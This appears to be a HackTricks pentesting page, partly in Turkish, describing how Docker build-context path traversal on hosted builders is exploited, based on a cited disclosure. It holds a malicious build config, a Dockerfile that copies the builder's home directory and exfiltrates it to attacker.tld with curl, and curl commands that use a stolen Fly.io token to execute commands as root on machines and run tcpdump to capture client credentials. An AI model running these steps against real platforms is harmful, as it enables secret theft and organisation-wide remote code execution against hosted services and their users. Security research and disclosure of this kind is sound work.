# Hosted Builders'da Docker Build Context'in Kötüye Kullanımı (Path Traversal, Exfil, and Cloud Pivot)

{{#include ../banners/hacktricks-training.md}}

## TL;DR

If a CI/CD platform or hosted builder lets contributors specify the Docker build context path and Dockerfile path, you can often set the context to a parent directory (e.g., "..") and make host files part of the build context. Then, an attacker-controlled Dockerfile can COPY and exfiltrate secrets found in the builder user’s home (for example, ~/.docker/config.json). Stolen registry tokens may also work against the provider’s control-plane APIs, enabling org-wide RCE.

## Saldırı yüzeyi

Many hosted builder/registry services do roughly this when building user-submitted images:
- Read a repo-level config that includes:
- build context path (sent to the Docker daemon)
- Dockerfile path relative to that context
- Copy the indicated build context directory and the Dockerfile to the Docker daemon
- Build the image and run it as a hosted service

If the platform does not canonicalize and restrict the build context, a user can set it to a location outside the repository (path traversal), causing arbitrary host files readable by the build user to become part of the build context and available to COPY in the Dockerfile.

Practical constraints commonly observed:
- The Dockerfile must reside within the chosen context path and its path must be known ahead of time.
- The build user must have read access to files included in the context; special device files can break the copy.

## PoC: Path traversal via Docker build context

Example malicious server config declaring a Dockerfile within the parent directory context:
```yaml
runtime: "container"
build:
dockerfile: "test/Dockerfile"   # Must reside inside the final context
dockerBuildPath: ".."           # Path traversal to builder user $HOME
startCommand:
type: "http"
configSchema:
type: "object"
properties:
apiKey:
type: "string"
required: ["apiKey"]
exampleConfig:
apiKey: "sk-example123"
```
Notlar:
- ".." kullanımı genellikle builder kullanıcısının home dizinine (ör. /home/builder) çözülür; bu dizin genellikle hassas dosyalar içerir.
- Dockerfile'ınızı repo'nun dizin adı altında yerleştirin (ör. repo "test" → test/Dockerfile) böylece genişletilmiş üst bağlam içinde kalır.

## PoC: host context'i ingest ve exfiltrate etmek için Dockerfile
```dockerfile
FROM alpine
RUN apk add --no-cache curl
RUN mkdir /data
COPY . /data                      # Copies entire build context (now builder’s $HOME)
RUN curl -si https://attacker.tld/?d=$(find /data | base64 -w 0)
```
$HOME'den sıklıkla elde edilen hedefler:
- ~/.docker/config.json (registry auths/tokens)
- Diğer cloud/CLI önbellekleri ve yapılandırmaları (ör. ~/.fly, ~/.kube, ~/.aws, ~/.config/*)

Tip: Depoda bir .dockerignore olsa bile, zafiyetli platform tarafı context seçimi hangi dosyaların daemon'a gönderileceğini belirler. Eğer platform, seçilen yolu repo’nuzun .dockerignore dosyasını değerlendirmeden önce daemon'a kopyalarsa, host dosyaları yine de açığa çıkabilir.

## Cloud pivot with overprivileged tokens (example: Fly.io Machines API)

Bazı platformlar, hem container registry hem de control-plane API için kullanılabilen tek bir bearer token sağlar. Eğer bir registry token'ı exfiltrate ederseniz, sağlayıcının API'sine karşı deneyin.

Çalınan token (~/.docker/config.json) kullanılarak Fly.io Machines API'ye yapılabilecek örnek API çağrıları:

Bir org içindeki uygulamaları listele:
```bash
curl -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps?org_slug=smithery"
```
Bir uygulamanın herhangi bir makinesinde root olarak bir komut çalıştır:
```bash
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"","command":["id"],"container":"","stdin":"","timeout":5}'
```
Sonuç: organizasyon genelinde remote code execution — token yeterli ayrıcalıklara sahipse tüm barındırılan uygulamalarda.

## Ele geçirilmiş barındırılan servislerden gizli bilgilerin çalınması

Barındırılan sunucularda exec/RCE ile, istemci tarafından sağlanan gizli bilgileri (API keys, tokens) toplayabilir veya prompt-injection attacks düzenleyebilirsiniz. Örnek: tcpdump kurun ve gelen kimlik bilgilerini çıkarmak için port 8080'deki HTTP trafiğini yakalayın.
```bash
# Install tcpdump inside the machine
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"apk add tcpdump","command":[],"container":"","stdin":"","timeout":5}'

# Capture traffic
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"tcpdump -i eth0 -w /tmp/log tcp port 8080","command":[],"container":"","stdin":"","timeout":5}'
```
Yakalanan istekler genellikle istemci kimlik bilgilerini başlıklarda, gövdelerde veya sorgu parametrelerinde içerir.

## Referanslar

- [Breaking MCP Server Hosting: Build-Context Path Traversal to Org-wide RCE and Secret Theft](https://blog.gitguardian.com/breaking-mcp-server-hosting/)
- [Fly.io Machines API](https://fly.io/docs/machines/api/)

{{#include ../banners/hacktricks-training.md}}
